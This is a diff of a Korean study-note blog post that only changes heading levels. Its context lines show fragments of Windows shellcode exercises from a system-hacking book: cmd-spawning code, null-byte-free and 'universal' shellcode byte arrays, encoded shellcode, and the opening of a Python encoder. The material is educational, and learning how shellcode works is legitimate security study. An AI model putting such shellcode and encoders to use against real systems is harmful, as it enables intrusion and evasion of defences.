@@ -9,7 +9,7 @@ tags:
 ---
 [윈도우 시스템 해킹 가이드 / 김현민 저] <br/>
 위의 책을 보면서 실습한 내용의 코드를 정리함.
-#### 1. 기본 쉘코드
+### 1. 기본 쉘코드
 ```c
 int _tmain(int argc, _TCHAR* argv[]) {
     char cmd[4] = {'c', 'm', 'd', '\0'};
@@ -17,7 +17,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
     ExitProcess(1);
 }
 ```
-#### 2. op코드 및 단순화
+### 2. op코드 및 단순화
 ```c
 int _tmain(int argc, _TCHAR* argv[]) {
 	__asm {
@@ -40,7 +40,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 	};
 }
 ```
-#### 3. Null byte 제거
+### 3. Null byte 제거
 ```c
 char shellcode[] =
     "\x33\xDB"
@@ -64,7 +64,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 	};
 }
 ```
-#### 4. Universal 쉘코드
+### 4. Universal 쉘코드
 ```c
 void main() {
 	__asm{
@@ -158,7 +158,7 @@ void main() {
 
 }
 ```
-#### 5. Universal 쉘코드 (바이트 코드)
+### 5. Universal 쉘코드 (바이트 코드)
 ```c
 char shellcode[] =
 "\xEB\x30\x42\xAD\x60\x03\xD8\x8B\xF3\x33\xC0\x33\xFF\xAC\x03\xF8"
@@ -180,7 +180,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 }
 ```
 
-#### 6. 쉘코드 인코딩
+### 6. 쉘코드 인코딩
 ```c
 char shellcode[] =
     "\xe8\xff\xff\xff\xff\xc2\x5e\x33\xc9\xb1\x9f\xbf\x58\x16\x30\x76"
@@ -204,7 +204,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 }
 ```
 
-#### * 쉘코드 인코더 (python3)
+### * 쉘코드 인코더 (python3)
 ```python
 import os, sys, random
 import struct
